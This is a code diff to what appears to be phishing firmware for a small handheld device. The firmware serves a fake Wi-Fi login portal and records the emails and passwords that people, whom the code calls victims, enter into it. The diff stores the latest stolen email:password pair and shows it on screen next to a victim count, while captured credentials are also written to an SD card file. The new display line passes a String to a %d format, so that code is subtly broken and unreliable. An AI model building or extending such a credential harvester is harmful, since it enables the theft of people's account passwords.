@@ -91,6 +91,7 @@
 int totalCapturedCredentials = 0;
 int previousTotalCapturedCredentials = -1;  // stupid hack but wtfe
 String capturedCredentialsHtml = "";
+String lastLogin = "";
 bool sdcardMounted = false;
 String apSsidName = String(DEFAULT_AP_SSID_NAME);
 
@@ -182,14 +183,14 @@ void setupWebServer() {
 #endif
 
     DISPLAY.print("Victim Login");
-
+    
     delay(50);
+
+    printHomeToScreen();
 
 #if defined(M5STICKCPLUS)
     SPEAKER.mute();
 #endif
-
-    DISPLAY.fillScreen(BLACK);
 
 #if defined(HAS_LED)
     blinkLed();
@@ -242,6 +243,10 @@ void printHomeToScreen() {
   DISPLAY.print(apSsidName);
   DISPLAY.println("");
   DISPLAY.printf("Victim Count: %d\n", totalCapturedCredentials);
+  if (lastLogin != ""){
+    DISPLAY.printf("Last login: %d\n", lastLogin);
+  }
+  
 }
 
 String getInputValue(String argName) {
@@ -301,12 +306,11 @@ String index_POST() {
   String email = getInputValue("email");
   String password = getInputValue("password");
   capturedCredentialsHtml = "<li>Email: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + capturedCredentialsHtml;
+  lastLogin = email + ":" + password;
 
 #if defined(HAS_SDCARD)
   appendToFile(SD, SD_CREDS_PATH, String(email + " = " + password).c_str());
 #endif
-
-    DISPLAY.print(email + ":" + password);
 
     return getHtmlContents(LOGIN_AFTER_MESSAGE);
 }
